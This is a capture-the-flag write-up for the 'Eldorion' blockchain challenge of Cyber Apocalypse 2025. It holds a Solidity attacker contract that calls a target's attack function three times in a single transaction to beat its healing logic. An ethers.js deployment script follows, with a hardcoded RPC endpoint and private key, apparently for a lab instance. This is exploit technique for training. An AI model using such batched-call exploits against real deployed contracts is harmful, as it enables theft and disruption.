---
layout: load_md
title: The White Circle | Cyber Apocalypse 2025 | Eldorion Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2025
parent: cyber_apocalypse_2025
category: blockchain
challenge: Eldorion
tags: "blockchain, starry, solidity, ethers"
date: 2025-03-29T00:00:00+00:00
last_update: 2025-03-29T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2025</h1>


## Eldorion
> Solved by Starry-Lord

![](https://i.imgur.com/VxfRD0j.png)


This Beast was killed with adding a `attacker.sol` contract to bypass the “eternal resilience” function, which kept healing the boss after each attack. So we needed to make a triple attack:


    cat contracts/attack.sol                                                                                        
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    interface IEldorion {
        function attack(uint256 damage) external;
    }
    
    contract Attacker {
        function attackThree(address target) external {
            IEldorion(target).attack(100);
            IEldorion(target).attack(100);
            IEldorion(target).attack(100);
        }
    }

here is the attack script with ethers.js v5 (because I never managed to make this challenge return valid JSON with v6):


    const fs = require("fs");
    const path = require("path");
    const solc = require("solc");
    const { ethers } = require("ethers");
    
    // === Config ===
    const RPC_URL = "http://83.136.253.25:50179";
    const PRIVATE_KEY = "0x0ce0d36d2fb2e0cfc7f413aec7acf865871b6f71f28ffda18cff63ab50a8c59c";
    
    const eldorionAddress = "0x6114F5Aca890BaE0b153de34Cd024ba24C2A3A68";
    const setupAddress    = "0xaed4036993875E6C22E37BC1a12EFB81e89A9222";
    
    const eldorionAbi = [
      "function health() view returns (uint256)",
      "function isDefeated() view returns (bool)"
    ];
    const setupAbi = [
      "function isSolved() view returns (bool)"
    ];
    const attackerAbi = [
      "function attackThree(address target) external"
    ];
    
    // === Setup Provider + Signer ===
    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const signer = new ethers.Wallet(PRIVATE_KEY, provider);
    
    // === Compile Attacker.sol ===
    async function compileAttacker() {
      const filePath = path.join(__dirname, "../contracts/attack.sol");
      const source = fs.readFileSync(filePath, "utf8");
    
      const input = {
        language: "Solidity",
        sources: {
          "attack.sol": { content: source }
        },
        settings: {
          outputSelection: {
            "*": {
              "*": ["abi", "evm.bytecode"]
            }
          }
        }
      };
    
      const output = JSON.parse(solc.compile(JSON.stringify(input)));
    
      // Print compilation errors
      if (output.errors) {
        for (const error of output.errors) {
          console.error(error.formattedMessage);
        }
      }
    
      const contract = output.contracts["attack.sol"]?.["Attacker"];
      if (!contract) {
        throw new Error("❌ Compilation failed: Attacker contract not found.");
      }
    
      return {
        abi: contract.abi,
        bytecode: contract.evm.bytecode.object
      };
    }
    
    // === Main Execution ===
    async function main() {
      console.log("Attacker:", await signer.getAddress());
    
      const { abi, bytecode } = await compileAttacker();
    
      const factory = new ethers.ContractFactory(abi, bytecode, signer);
      const attacker = await factory.deploy();
      await attacker.deployed();
      console.log("🚀 Attacker contract deployed at:", attacker.address);
    
      const tx = await attacker.attackThree(eldorionAddress);
      await tx.wait();
      console.log("⚔ Sent 3 attacks in a single transaction!");
    
      const eldorion = new ethers.Contract(eldorionAddress, eldorionAbi, signer);
      const setup = new ethers.Contract(setupAddress, setupAbi, signer);
    
      const health = await eldorion.health();
      console.log("🧪 Eldorion's Health:", health.toString());
    
      const defeated = await eldorion.isDefeated();
      console.log("💀 Eldorion Defeated?", defeated);
    
      const solved = await setup.isSolved();
      console.log("🏁 Challenge Solved?", solved ? "✅ YES" : "❌ Not yet");
    
      if (solved) {
        console.log("🎉 Go grab your flag!");
      }
    }
    
    main().catch((err) => {
      console.error("💥 Error:", err.message || err);
    });
    
![](https://i.imgur.com/Zmnbjk5.png)

